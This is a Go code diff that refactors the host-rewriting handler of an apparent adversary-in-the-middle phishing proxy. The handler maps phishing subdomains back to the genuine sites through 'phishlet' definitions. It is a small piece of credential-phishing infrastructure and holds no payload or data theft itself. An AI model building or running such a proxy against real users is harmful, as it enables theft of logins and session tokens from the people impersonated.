@@ -15,10 +15,10 @@ type URLRewriter struct{}
 func (h *URLRewriter) Name() string { return "URLRewriter" }
 
 func (h *URLRewriter) Handle(ctx *aitm.ProxyContext, req *http.Request) error {
-	if ctx.Phishlet == nil || ctx.Deployment == nil {
+	if ctx.Phishlet == nil {
 		return nil
 	}
-	origHost := resolveOrigHost(ctx.Phishlet, ctx.Deployment, req.Host)
+	origHost := resolveOrigHost(ctx.Phishlet, req.Host)
 	if origHost != "" {
 		req.Host = origHost
 		req.URL.Host = origHost
@@ -27,10 +27,10 @@ func (h *URLRewriter) Handle(ctx *aitm.ProxyContext, req *http.Request) error {
 	return nil
 }
 
-func resolveOrigHost(def *aitm.PhishletDef, deployment *aitm.PhishletDeployment, phishHost string) string {
+func resolveOrigHost(p *aitm.Phishlet, phishHost string) string {
 	lowerPhishHost := strings.ToLower(phishHost)
-	for _, proxyHost := range def.ProxyHosts {
-		phishFQDN := strings.ToLower(proxyHost.PhishSubdomain + "." + deployment.BaseDomain)
+	for _, proxyHost := range p.ProxyHosts {
+		phishFQDN := strings.ToLower(proxyHost.PhishSubdomain + "." + p.BaseDomain)
 		if lowerPhishHost == phishFQDN {
 			return proxyHost.OrigSubdomain + "." + proxyHost.Domain
 		}
